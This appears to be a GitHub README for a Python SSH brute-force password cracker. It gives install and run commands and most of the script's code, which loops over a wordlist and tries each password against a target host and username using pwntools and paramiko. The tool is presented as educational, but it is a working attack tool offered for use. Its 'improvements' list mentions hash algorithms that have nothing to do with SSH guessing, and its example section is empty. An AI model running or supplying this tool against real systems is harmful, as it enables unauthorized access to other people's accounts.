# SSH Brute-force Cracker

## Introduction

This is a basic SSH brute-force cracker script written in Python. The tool attempts to find the correct password for an SSH account by trying a list of passwords. This script is a practical example of how brute-force attacks work and can help you understand concepts related to SSH security and password cracking.

## Features

- **SSH Brute-force Attack**: Attempts to guess the SSH password for a given host and username.
- **Custom Port**: Supports specifying a custom port for the SSH service (default is 22).
- **Password List**: Uses a wordlist of possible passwords to attempt cracking.
- **Real-time Feedback**: Provides feedback on each attempt and reports the success or failure of each password attempt.

## Prerequisites

- Python 3.x installed on your system.
- The `pwn` and `paramiko` libraries for SSH connections and exceptions handling. You can install them using `pip`:
    ```bash
    pip install pwntools paramiko
    ```
- Basic understanding of SSH, brute-force attacks, and command-line operations.

## Usage

To run the SSH brute-force cracker, use the following command:

```bash
python3 ssh_bruteforce_cracker.py <host> <username> [--port <port>]
```
- `<host>`: The IP address or hostname of the target SSH server.
- `<username>`: The username to attempt to authenticate with.
- `--port <port>` (Optional): The port to connect to (default is 22).
## How It Works
1. **Argument Parsing:** 
   - The script uses argparse to handle command-line arguments for the SSH host, username, and optionally the port.

```python
parser = argparse.ArgumentParser(description="SSH Brute-force script")
parser.add_argument("host", type=str, help="The host to connect to")
parser.add_argument("username", type=str, help="The username to use")
parser.add_argument("--port", type=int, default=22, help="The port to connect to (default: 22)")
args = parser.parse_args()
```
2. **Retrieve Arguments:**
   - Extracts the host, username, and port from the command-line arguments.
  ```python
  host = args.host
  username = args.username
  port = args.port
  ```

3. **Start Brute-force Attempt:**
   - Opens the password list file and reads it line by line. For each password, it attempts to establish an SSH connection.
   - If the connection is successful, it reports the valid password and stops further attempts.
  ```python
  try:
    with open(password_list_path, "r") as password_list:
        for password in password_list:
            password = password.strip("\n")
            try:
                print("[{}] Attempting password: '{}'!".format(attempts, password))
                response = ssh(host=host, user=username, password=password, port=port, timeout=1)

                if response.connected():
                    print("[>] Valid password found: '{}'!".format(password))
                    response.close()
                    break
                response.close()
            except paramiko.ssh_exception.AuthenticationException:
                print("[X] Invalid Password")
            attempts += 1

  ```
4. **Exception Handling:**
   - Manages common issues such as missing password list files and general exceptions.
   ```python
    except FileNotFoundError:
     print(f"[!] Password list file not found: {password_list_path}")
    except Exception as e:
     print(f"[!] An error occurred: {str(e)}")
   ```

### Example:






## Potential Improvements
- Extend the script to support additional hash algorithms like MD5 or SHA-1.
- Implement more efficient techniques or parallel processing to speed up the brute-force attack.
- Include features like progress bars, estimated time, or interactive command-line options.

## Contributing
Feel free to submit issues or pull requests for improvements.

## Contact
For any questions or feedback, you can reach me at **syed4000saad@gmail.com**
